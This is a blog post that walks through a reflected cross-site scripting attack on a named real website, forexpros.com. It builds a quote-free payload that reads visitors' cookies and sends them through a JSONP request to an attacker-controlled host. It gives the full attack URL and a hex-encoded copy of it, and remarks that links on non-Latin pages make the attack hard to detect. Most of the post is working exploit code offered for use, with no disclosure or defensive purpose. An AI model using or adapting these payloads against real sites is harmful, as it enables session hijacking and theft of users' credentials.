---
layout: post
tags: 
title: XSS with no quotes
---

What we have:
http://www.forexpros.com/directory/forex-brokers?SoftwareTypeMobile=
Query string parameter ?SoftwareTypeMobile is open for potential XSS attack (and there are few more on the same page) becuase it's contents is being printed in the HTML document, here is how:

We can pass something like that in order to EMBED JavaScript in page:

{% highlight javascript %}
?SoftwareTypeMobile="><script>document.write(document.cookie)</script><a
{% endhighlight %}

This will just print User’s Cookie somewhere on the page (specifically in this case - in pagination).

Let’s move on..
Now because Server-side of that page sanitizes this parameter and adds slashes to quotes and double quotes we can’t really use quotes, which limits us a lot, BUT it doesn’t prevent XSS completely..

Let’s take a look at how we can write fully functional snippet without using ANY quote/double quote in JS (remember, double quote with slash before it in HTML is just a normal double quote):


{% highlight html %}
{% raw %}
"></a>
<form name=xssform>
<input type=hidden name=xssurl value=http://xxx.xxx.xxx.xxx/xss/?cookie= />
<input type=hidden name=xsstype value=jsonp />
<input type=hidden name=xssjsonp value=jsonp_callback />
</form>
<script>
$.ajax({
  dataType: document.xssform.xsstype.value,
  data: {cookie:document.cookie},
  jsonp: document.xssform.xssjsonp.value,
  url: document.xssform.xssurl.value
})
</script>
<a
{% endraw %}
{% endhighlight %}
    
First, we create a FORM containing cells with data we need (because browser engine doesn’t require quotes in HTML, we don’t have to provide them, browser will complete them for us) Next, we utilize jQuery to send a JSONP (cross-domain AJAX request with the full COOKIE string as a value of parameter “cookie”) So you get an idea, server side script will get this data and bla bla bla..

In order for this snippet to function properly, we have to remove all linebreaks and form it as a ONE LINE string here it is:

{% highlight javascript %}
{% raw %}
"></a><form name=xssform><input type=hidden name=xssurl value=http://xxx.xxx.xxx.xxx/xss/?cookie= /><
input type=hidden name=xsstype value=jsonp /><input type=hidden name=xssjsonp value=jsonp_callback /></form><script>
$.ajax({dataType: document.xssform.xsstype.value,data: {cookie:document.cookie},jsonp: document.xssform.xssjsonp.value,
url: document.xssform.xssurl.value})</script><a
{% endraw %}
{% endhighlight %}

Well, this would already work on FF & Opera Here is the full URL (note that xxx.xxx.xxx.xxx should be replaced with real HOSTNAME):

{% highlight javascript %}
http://www.forexpros.com/directory/forex-brokers?SoftwareTypeMobile="></a><form name=xssform><input type=hidden
name=xssurl value=http://xxx.xxx.xxx.xxx/xss/?cookie= /><input type=hidden name=xsstype value=jsonp /><input type=hidden name=xssjsonp
value=jsonp_callback /></form><script>$.ajax({dataType: document.xssform.xsstype.value,data: {cookie:document.cookie},
jsonp: document.xssform.xssjsonp.value,url: document.xssform.xssurl.value})</script><a
{% endhighlight %}

..alternatively you could convert parameter value into HEX entities and it will look like so:

http://www.forexpros.com/directory/forex-brokers?SoftwareTypeMobile=%22%3E%3C%2F%61%3E%3C%66%6F%72%6D%20%6E%61%6D%65%3D%78%73%73%66%6F%72
%6D%3E%3C%69%6E%70%75%74%20%74%79%70%65%3D%68%69%64%64%65%6E%20%6E%61%6D%65%3D%78%73%73%75%72%6C%20%76%61%6C%75%65%3D%68%74%74%70%3A%2F%2F%78%78
%78%2E%78%78%78%2E%78%78%78%2E%78%78%78%2F%78%73%73%2F%3F%63%6F%6F%6B%69%65%3D%20%2F%3E%3C%69%6E%70%75%74%20%74%79%70%65%3D%68%69%64%64%65%6E%20
%6E%61%6D%65%3D%78%73%73%74%79%70%65%20%76%61%6C%75%65%3D%6A%73%6F%6E%70%20%2F%3E%3C%69%6E%70%75%74%20%74%79%70%65%3D%68%69%64%64%65%6E%20%6E%61
%6D%65%3D%78%73%73%6A%73%6F%6E%70%20%76%61%6C%75%65%3D%6A%73%6F%6E%70%5F%63%61%6C%6C%62%61%63%6B%20%2F%3E%3C%2F%66%6F%72%6D%3E%3C%73%63%72%69%70
%74%3E%24%2E%61%6A%61%78%28%7B%64%61%74%61%54%79%70%65%3A%20%64%6F%63%75%6D%65%6E%74%2E%78%73%73%66%6F%72%6D%2E%78%73%73%74%79%70%65%2E%76%61%6C
%75%65%2C%64%61%74%61%3A%20%7B%63%6F%6F%6B%69%65%3A%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%7D%2C%6A%73%6F%6E%70%3A%20%64%6F%63%75%6D%65%6E
%74%2E%78%73%73%66%6F%72%6D%2E%78%73%73%6A%73%6F%6E%70%2E%76%61%6C%75%65%2C%75%72%6C%3A%20%64%6F%63%75%6D%65%6E%74%2E%78%73%73%66%6F%72%6D%2E%78
%73%73%75%72%6C%2E%76%61%6C%75%65%7D%29%3C%2F%73%63%72%69%70%74%3E%3C%61
some of pages on Forexpros non-latin websites look like this:

http://www.forexpros.ru/news/%D0%9D%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8-%D0%A4%D0%BE%D1%80%D0%B5%D0%BA%D1%81/%D0%A4
%D0%BE%D1%80%D0%B5%D0%BA%D1%81---eur-usd-%D0%B2%D1%8B%D1%80%D0%BE%D1%81-%D0%B2%D0%BE-%D0%B2%D1%80%D0%B5%D0%BC%D1%
8F-%D0%B0%D0%B7%D0%B8%D0%B0%D1%82%D1%81%D0%BA%D0%BE%D0%B9-%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%B8-55799
so it’s hard to detect a problem in previous link
